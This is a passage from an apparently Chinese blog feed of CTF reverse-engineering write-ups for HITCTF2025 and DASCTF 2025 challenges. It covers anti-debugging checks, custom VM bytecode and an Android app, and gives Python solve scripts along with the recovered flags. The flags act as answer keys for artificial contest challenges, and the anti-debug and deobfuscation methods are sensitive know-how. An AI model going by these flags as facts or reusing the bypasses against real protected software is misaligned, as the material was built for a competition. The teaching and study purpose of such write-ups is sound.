[ebp+0x172]</span><br><span class="line"> 167:   ff d0                   call   eax</span><br><span class="line"> 169:   c3                      ret    </span><br><span class="line"> 16a:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16b:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16c:   aa                      stos   BYTE PTR es:[edi],al</span><br><span class="line"> 16d:   0a bb bb bb 0b cc       or     bh,BYTE PTR [ebx-0x33f44445]</span><br><span class="line"> 173:   cc                      int3   </span><br><span class="line"> 174:   cc                      int3   </span><br><span class="line"> 175:   0c dd                   or     al,0xdd</span><br><span class="line"> 177:   dd dd                   fstp   st(5)</span><br><span class="line"> 179:   0d ff ff ff ff          or     eax,0xffffffff</span><br><span class="line">import struct</span><br><span class="line">code = Path(&quot;1_stage2.bin&quot;).read_bytes()</span><br><span class="line"></span><br><span class="line">key2 = code[0x1ba:0x1ba+0x1e]</span><br><span class="line">enc = b&quot;\xF5\x49\x91\x61\x4E\x3E\x6A\x39\xDD\x26\xA8\x42\x7D\xEC\x1F\x25&quot; \</span><br><span class="line">    b&quot;\x43\x5F\x69\xB7\xF7\xCD\x08\xC7\x6C\xBB\xBB\x3C&quot; </span><br><span class="line">flag = bytes(enc[i] ^ key2[i] for i in range(len(enc)))</span><br><span class="line">print(flag)  </span><br></pre></td></tr></table></figure><p>flag{HITCTF_2025_86053e16bb6f}</p><h3 id="Snake2"><a href="#Snake2" class="headerlink" title="Snake2"></a>Snake2</h3><p>做了懒得写了</p><h3 id="Exception-Key-二血"><a href="#Exception-Key-二血" class="headerlink" title="Exception Key [二血]"></a>Exception Key [二血]</h3><p>三条反调试：</p><ul><li>anti_debug_is_debugger_present：IsDebuggerPresent 检测，命中则退出。</li><li>anti_debug_debugport：调用 NtQueryInformationProcess(ProcessDebugPort)，若有调试端口则退出，否则将 byte_42FF88&#x3D;-1。</li><li>anti_debug_timing：用 QPC 测 200 万次循环耗时，超过 200ms 则退出。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145611239.png" alt="image-20260115145611239"></p><p>主动触发除零异常,dword_42FF8C 置为异常码 0xC0000005,用 word_4213F8[code&amp;1]&#x3D;0x260 通过 _Locimp::_Addfac 写入 unk_42FF90</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145624744.png" alt="image-20260115145624744"></p><p>取自身 EXE 路径并构造命令行 self –child，传给 spawn_child_under_debug 启动一个子进程在调试模式下。 在收到首个 EXCEPTION_DEBUG_EVENT 时，byte_42FF88++（变为 1）。 </p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145638395.png" alt="image-20260115145638395"></p><p>里面做了右旋，affine等处理</p><p>计算 LCG 种子，若 byte_42FF88 !&#x3D; 0 则 seed &#x3D; byte_42FF88 + 0x12345678，否则 seed &#x3D; dword_42FF8C ^ a5。在正常无调试下，byte_42FF88&#x3D;1，得到 seed&#x3D;0x12345679</p><p>exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">def lcg_next(s):</span><br><span class="line">  return (1664525 * s + 1013904223) &amp; 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line">base = [</span><br><span class="line">  0x1f,0x06,0x67,0x37,0x9c,0x31,0x2c,0x30,0xb7,0xf6,0xa2,0xce,</span><br><span class="line">  0x3b,0x5d,0x45,0x6f,0x25,0x69,0x48,0x8e,0xdc,0xe6,0x1e,0x79,</span><br><span class="line">  0xb3,0x99,0xe9,0xf3,0x4a,0xe7,0x0e,0x80,0x4c,0x73,0x68,0x81,</span><br><span class="line">  0x6c,0x7c,0x1a,0x4d,0xdc,0x1c,0xeb,0xe0,0x3e,0x78,0x4c,0xfd</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">a4 = 0x260</span><br><span class="line">a5 = 0x4D04  # 0x4D00 + ((0xC0000005 - 1) &amp; 0xFF)</span><br><span class="line"></span><br><span class="line"># xor &amp; 右旋</span><br><span class="line">xor_key = (a4 ^ 0x5A) &amp; 0xFF    </span><br><span class="line">rot = (a4 &gt;&gt; 8) &amp; 7               </span><br><span class="line">tmp = []</span><br><span class="line">for b in base:</span><br><span class="line">  b ^= xor_key</span><br><span class="line">  b = ((b &gt;&gt; rot) | ((b &lt;&lt; (8 - rot)) &amp; 0xFF)) &amp; 0xFF  </span><br><span class="line">  tmp.append(b)</span><br><span class="line"></span><br><span class="line">mul_inv = pow((a5 | 1) &amp; 0xFF, -1, 256)  </span><br><span class="line">sub = (a5 &gt;&gt; 8) &amp; 0xFF                   </span><br><span class="line">expected = [ (mul_inv * ((b - sub) &amp; 0xFF)) &amp; 0xFF for b in tmp ]</span><br><span class="line"></span><br><span class="line"># 0x12345679</span><br><span class="line">seed = 0x12345679</span><br><span class="line">flag_bytes = []</span><br><span class="line">state = seed</span><br><span class="line">for e in expected:</span><br><span class="line">  state = lcg_next(state)</span><br><span class="line">  rand = state &amp; 0xFF</span><br><span class="line">  flag_bytes.append(e ^ rand)</span><br><span class="line"></span><br><span class="line">flag = bytes(flag_bytes)</span><br><span class="line">print(flag.decode())  # HITCTF2025&#123;57c8af8e-4e66-4543-b442-00c5</span><br></pre></td></tr></table></figure><h3 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h3><p>简单的VM</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145456864.png" alt="image-20260115145456864"></p><p>丢给AI直接出了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. s[0]=&#x27;f&#x27;; 2) s[1]+1=&#x27;m&#x27; → s[1]=&#x27;l&#x27;;</span><br><span class="line">2. s[2]^s[3]=0x06, s[3]^s[4]=0x1C, s[2]^s[4]=0x1A → 取 s[2..4]=&quot;ag&#123;&quot;；</span><br><span class="line">3. s[6]=&#x27;i&#x27;; s[5]^&#x27;i&#x27;=0x21 → s[5]=&#x27;H&#x27;; s[7]^&#x27;i&#x27;=0x3D → s[7]=&#x27;T&#x27;;</span><br><span class="line">4. s[9]==s[7]=&#x27;T&#x27;; s[8]^s[9]=0x17 → s[8]=&#x27;C&#x27;; s[10]^s[9]=0x12 → s[10]=&#x27;F&#x27;;</span><br><span class="line">5. s[11]*2=190 → s[11]=&#x27;_&#x27;; s[12]=s[14]=50 (&#x27;2&#x27;); s[15]=53 (&#x27;5&#x27;);</span><br><span class="line">6. s[17]=0（字符串终止）；s[16]=s[4]+2 → &#x27;&#125;&#x27;；s[13] 未被约束。</span><br></pre></td></tr></table></figure><p>解析字节码：根据 vm_execute 的 opcode 定义，每条指令长度固定：halt(0)1B, out_const(1)3B, reg_from_in(2)3B, mov(3)3B, mov_imm(4)3B, add(5)3B, add_imm(6)3B, sub(7)3B, sub_imm(8)3B, xor(9)3B, xor_imm(0xA)3B, cmp(0xB)3B, cmp_imm(0xC)3B, jmp(0xD)2B, jnz(0xE)2B, read(0x10)1B, print(0x11)1B。用一个小 Python 脚本按长度切分。</p><p>vm_bytecode_prompt解析结果：一串 out_const reg,val 把输出缓冲区填成 “Enter flag: “，然后 print; halt。所以是提示字串。</p><p>vm_bytecode_checker（280 字节）解析结果：开头 jmp 0x3c 跳过“Wrong!” 构造，末尾 jmp 0x1c 跳到“Correct!” 构造。中间指令用 read 取输入到 input[0..]，reg_from_in 把输入字节搬到 0..7 寄存器，然后通过 cmp_imm、xor、cmp 等组合出约束，失败就 jnz 0x02 跳回错误分支打印“Wrong!”。步进指令即可得到下列等式（用 reg[r] 表示中间寄存器，input[i] 表示输入）：</p><p>cmp_imm reg0,input[0], 0x66 (‘f’) → s[0]&#x3D;’f’</p><p>reg_from_in reg1,input[1]; mov reg0,reg1; add_imm reg1,1; cmp_imm reg1,109 (‘m’) → s[1]+1&#x3D;’m’ → s[1]&#x3D;’l’</p><p>reg_from_in reg1,input[2]; reg_from_in reg2,input[3]; reg_from_in reg3,input[4]; mov reg0,reg1; xor reg0,reg2; cmp_imm reg0,6 + mov reg0,reg2; xor reg0,reg3; cmp_imm reg0,0x1C + mov reg0,reg1; xor reg0,reg3; cmp_imm reg0,0x1A → 解得 s[2..4]&#x3D;”ag{“</p><p>reg_from_in reg1,input[5]; … reg_from_in reg3,input[7]; cmp_imm reg2 (s[6]),105 (‘i’); mov reg0,reg1; xor reg0,reg2; cmp_imm 0x21; mov reg0,reg3; xor reg0,reg2; cmp_imm 0x3D → s[6]&#x3D;’i’, s[5]&#x3D;’H’, s[7]&#x3D;’T’</p><p>reg_from_in reg4,input[8]; reg_from_in reg5,input[9]; reg_from_in reg6,input[10]; cmp reg5,reg3 (s[9]&#x3D;&#x3D;s[7]); mov reg0,reg4; xor reg0,reg5; cmp_imm 0x17; mov reg0,reg6; xor reg0,reg5; cmp_imm 0x12 → s[9]&#x3D;’T’, s[8]&#x3D;’C’, s[10]&#x3D;’F’</p><p>reg_from_in reg1..reg7,input[11..17]; cmp reg2,reg4 (s[12]&#x3D;&#x3D;s[14]); mov reg0,reg1; add reg0,reg0; cmp_imm 0xBE → 2*s[11]&#x3D;190 → s[11]&#x3D;’_’；后续 xor reg0,reg0; cmp reg0,reg7 强制 s[17]&#x3D;0；add reg0,reg2; cmp_imm 50 → s[12]&#x3D;50(‘2’); sub_imm reg0,2; cmp_imm 48 → s[14]&#x3D;50(‘2’); add_imm reg0,5; cmp reg0,reg5 → s[15]&#x3D;53(‘5’); reg_from_in reg0,input[4]; sub reg6,reg0; cmp_imm reg6,2 → s[16]&#x3D;s[4]+2&#x3D;’}’；s[13] 未出现</p><p>flag{HiTCTF_2025}</p><h3 id="ComplexVM"><a href="#ComplexVM" class="headerlink" title="ComplexVM"></a>ComplexVM</h3><p>跟上题一样，不知道complexVM在哪只是逻辑稍微复杂，但是打法是一样的</p><p>程序是自制 VM。ctx+8 是寄存器区，ctx+0x10 旗标（bit0&#x3D;ZF），ctx+0x14 为 PC，ctx+0x18 为 SP，ctx+0x1c 开头是字节码，用户输入缓冲在 ctx+0x41c。sub_140001210 是解释器，sub_140004050 做 reg[x]-imm 并置标志。</p><p>主要指令：</p><ul><li>0x1F：从输入缓冲加载到寄存器（ctx+0x41c[idx] → reg[dest]）。</li><li>0x18：与立即数比较，仅设标志。</li><li>0x17：寄存器与寄存器比较。</li><li>0x12：JNZ，条件跳转依据 ZF。</li><li>0x22&#x2F;0x21&#x2F;0x23&#x2F;0x24：给寄存器写入常量（带常量偏移）。</li></ul><p>字节码逐字节对输入做 load→compare→JNZ，推得各位置字符：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">code_hex = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">13 0 75 6 5 5 7 1 72 7 3 6e 7 2 6f 7 4 67 7 0 57 20 0 0 20 4 4 20 2 2 20 3 3 20 1 1 20 5 5 1e 0 ff</span></span><br><span class="line"><span class="string">7 1 6f 7 4 65 7 2 72 7 6 74 7 0 43 7 5 63 7 3 72 6 7 7 20 3 3 20 1 1 20 2 2 20 0 0 20 4 4 20 6 6 20 5 5</span></span><br><span class="line"><span class="string">20 7 7 1e 0 ff 7 0 ff 9 0 1 12 0 60 14 0 0 7 0 aa 7 1 55 6 0 1 14 0 0 7 0 0 13 0 69 7 1 ff 17 0 1 12 0 3 1c 0 0</span></span><br><span class="line"><span class="string">1f 0 2 18 0 61 12 0 3 1f 0 1 18 0 6c 12 0 3 1f 0 0 18 0 66 12 0 3 1f 0 3 18 0 67 12 0 3 1f 0 4 18 0 7b 12 0 3</span></span><br><span class="line"><span class="string">1f 0 7 18 0 54 12 0 3 1f 0 6 18 0 49 12 0 3 1f 0 5 18 0 48 12 0 3 1f 0 8 18 0 43 12 0 3 1f 0 c 18 0 30 12 0 3</span></span><br><span class="line"><span class="string">1f 0 a 18 0 46 12 0 3 1f 0 b 18 0 32 12 0 3 1f 0 9 18 0 54 12 0 3 1f 0 d 18 0 32 12 0 3 1f 0 e 18 0 35 12 0 3</span></span><br><span class="line"><span class="string">1f 0 f 18 0 5f 12 0 3 1f 0 10 1f 1 b 17 0 1 12 0 3 1f 0 11 22 1 a8 17 1 0 12 0 3 1f 0 12 9 1 1 17 1 0 12 0 3</span></span><br><span class="line"><span class="string">7 0 80 15 0 0 13 0 5d 16 0 0 9 0 1 12 1 3e 1f 0 13 6 1 0 18 1 52 12 0 3 1f 0 14 1f 1 17 6 0 1 12 0 3 18 1 63</span></span><br><span class="line"><span class="string">12 0 3 1f 0 15 1f 1 16 3 1 0 18 1 3 12 0 3 1f 1 10 8 1 2 17 1 0 12 0 3 1f 0 18 18 0 7d 12 0 3 1f 0 19 18 0 0</span></span><br><span class="line"><span class="string">12 0 3 7 0 80 15 0 0 13 0 5d 16 0 0 9 0 1 12 1 9b 10 0 2a ff 0 0 7 0 49 7 1 6e 7 2 70 7 3 75 7 4 74 7 5 20 20 0 0</span></span><br><span class="line"><span class="string">20 1 1 20 2 2 20 3 3 20 4 4 20 5 5 7 0 79 7 1 6f 7 2 75 7 3 72 7 4 20 7 5 66 20 6 0 20 7 1 20 8 2 20 9 3 20 a 4 20 b 5 7 0 6c 7 1 61 7 2</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">code = [<span class="built_in">int</span>(x, <span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> code_hex.split()]</span><br><span class="line"></span><br><span class="line">pairs = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(code):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0x1f</span> <span class="keyword">and</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code):</span><br><span class="line">        dest, idx = code[i + <span class="number">1</span>], code[i + <span class="number">2</span>]</span><br><span class="line">        <span class="comment"># 向后几步找 0x18 同目标寄存器的比较立即数</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            k = i + j</span><br><span class="line">            <span class="keyword">if</span> k + <span class="number">2</span> &gt;= <span class="built_in">len</span>(code): <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> code[k] == <span class="number">0x18</span> <span class="keyword">and</span> code[k + <span class="number">1</span>] == dest:</span><br><span class="line">                pairs[idx] = code[k + <span class="number">2</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(pairs):</span><br><span class="line">    v = pairs[k]</span><br><span class="line">    ch = <span class="built_in">chr</span>(v) <span class="keyword">if</span> <span class="number">32</span> &lt;= v &lt; <span class="number">127</span> <span class="keyword">else</span> v</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ch&#125;</span>&quot;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag{HITCTF2025_287ec47c}</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><p>有毒 快跑</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HITCTF2025-wp&quot;&gt;&lt;a href=&quot;#HITCTF2025-wp&quot; class=&quot;headerlink&quot; title=&quot;HITCTF2025 wp&quot;&gt;&lt;/a&gt;HITCTF2025 wp&lt;/h1&gt;&lt;p&gt;好久没更新了，期末考试太忙了，之前打的比赛传一下&lt;/</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2025下半年赛 RE wp</title>
    <link href="http://matriy330.github.io/8b3b5504/"/>
    <id>http://matriy330.github.io/8b3b5504/</id>
    <published>2025-12-07T06:44:33.000Z</published>
    <updated>2025-12-07T06:45:46.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DASCTF-2025下半年赛-RE-wp"><a href="#DASCTF-2025下半年赛-RE-wp" class="headerlink" title="DASCTF 2025下半年赛 RE wp"></a>DASCTF 2025下半年赛 RE wp</h1><h2 id="ezmac"><a href="#ezmac" class="headerlink" title="ezmac"></a>ezmac</h2><p>简单逻辑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x7d</span>,<span class="number">0x7b</span>,<span class="number">0x68</span>,<span class="number">0x7f</span>,<span class="number">0x69</span>,<span class="number">0x78</span>,<span class="number">0x44</span>,<span class="number">0x78</span>,<span class="number">0x72</span>,<span class="number">0x21</span>,<span class="number">0x74</span>,<span class="number">0x76</span>,<span class="number">0x75</span>,<span class="number">0x22</span>,<span class="number">0x26</span>,<span class="number">0x7b</span>,<span class="number">0x7c</span>,<span class="number">0x7e</span>,<span class="number">0x78</span>,<span class="number">0x7a</span>,<span class="number">0x2e</span>,<span class="number">0x2d</span>,<span class="number">0x7f</span>,<span class="number">0x2d</span>]</span><br><span class="line">key_start = <span class="number">0x39</span>  <span class="comment"># 57</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(b ^ ((key_start + i) &amp; <span class="number">0xFF</span>)) <span class="keyword">for</span> i, b <span class="keyword">in</span> <span class="built_in">enumerate</span>(enc))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>DASCTF{83c720da35436cc0}</p><h2 id="androidfile"><a href="#androidfile" class="headerlink" title="androidfile"></a>androidfile</h2><blockquote><p>hacker截获了某公司的重要数据包和RSA公私钥，请你帮助他提取藏在数据包中的flag。</p></blockquote><p>RSA</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512061923909.png" alt="image-20251206192331850"></p><p>Java 层</p><p>生成两个 16 字节随机串作为 keyStr 和 ivStr（代码里就是 A() 生成的）。</p><p>用 RSA 公钥加密 keyStr、ivStr，分别前缀成 enkey_<RSA_ct_key>eniv_<RSA_ct_iv>，整体作为输入传给 native a_p，得到 RC4+base64 的第一段。</p><p>AES 部分：用 AES&#x2F;CBC&#x2F;PKCS5 对用户输入加密，得到第二段。UI 把第一段 + &lt;-encryptinput-&gt; + 第二段展示。</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062008658.png" alt="55c3a0e7-cd64-49b1-b456-de762479013c"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dasctf.androidfile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> R0.c;</span><br><span class="line"><span class="keyword">import</span> android.content.res.Resources;</span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.Window;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.J;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.K;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.p;</span><br><span class="line"><span class="keyword">import</span> androidx.activity.w;</span><br><span class="line"><span class="keyword">import</span> c0.C0121a;</span><br><span class="line"><span class="keyword">import</span> f.AbstractActivityC0139h;</span><br><span class="line"><span class="keyword">import</span> f.C0138g;</span><br><span class="line"><span class="keyword">import</span> i0.View$OnClickListenerC0168a;</span><br><span class="line"><span class="keyword">import</span> java.security.KeyFactory;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"><span class="keyword">import</span> java.security.spec.X509EncodedKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AbstractActivityC0139h</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: A  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> TextView f1684A;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: y  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> Button f1685y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* renamed from: z  reason: collision with root package name */</span></span><br><span class="line">    <span class="keyword">public</span> TextView f1686z;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(w.i(<span class="string">&quot;ZLIbw2UnROtssBo=\n&quot;</span>, <span class="string">&quot;Bdx/sQpOII0=\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.f739d.f1683b.f(<span class="string">&quot;androidx:appcompat&quot;</span>, <span class="keyword">new</span> <span class="title class_">C0121a</span>(<span class="built_in">this</span>));</span><br><span class="line">        i(<span class="keyword">new</span> <span class="title class_">C0138g</span>(<span class="built_in">this</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">A</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">i2</span> <span class="operator">=</span> w.i(<span class="string">&quot;EDXRQcjNLspDYIYUm5BxwktojhyTiGnaU3CWBIu9Xu9oTak5sLVW53BVsSGorU7/eF25\n&quot;</span>, <span class="string">&quot;IATjcvz4GKg=\n&quot;</span>);</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">stringBuffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">        <span class="type">Random</span> <span class="variable">random</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>; i3 &lt; <span class="number">16</span>; i3++) &#123;</span><br><span class="line">            stringBuffer.append(i2.charAt(random.nextInt(i2.length())));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stringBuffer.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">C</span><span class="params">(String str, String str2, String str3)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str2.getBytes();</span><br><span class="line">        <span class="type">byte</span>[] bytes2 = str3.getBytes();</span><br><span class="line">        <span class="type">SecretKeySpec</span> <span class="variable">secretKeySpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(bytes, w.i(<span class="string">&quot;Udks\n&quot;</span>, <span class="string">&quot;EJx/huJaZmg=\n&quot;</span>));</span><br><span class="line">        <span class="type">IvParameterSpec</span> <span class="variable">ivParameterSpec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(bytes2);</span><br><span class="line">        <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(w.i(<span class="string">&quot;BchPNMUH8BUUxl9IsxXSXiDkcnw=\n&quot;</span>, <span class="string">&quot;RI0cG4ZFszo=\n&quot;</span>));</span><br><span class="line">        cipher.init(<span class="number">1</span>, secretKeySpec, ivParameterSpec);</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeToString(cipher.doFinal(str.getBytes(w.i(<span class="string">&quot;yd86S2M=\n&quot;</span>, <span class="string">&quot;nIt8ZlvsRB4=\n&quot;</span>))), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">D</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = str.getBytes();</span><br><span class="line">        <span class="type">PublicKey</span> <span class="variable">generatePublic</span> <span class="operator">=</span> KeyFactory.getInstance(w.i(<span class="string">&quot;asEy\n&quot;</span>, <span class="string">&quot;OJJz9SnyFic=\n&quot;</span>)).generatePublic(<span class="keyword">new</span> <span class="title class_">X509EncodedKeySpec</span>(Base64.decode(w.i(<span 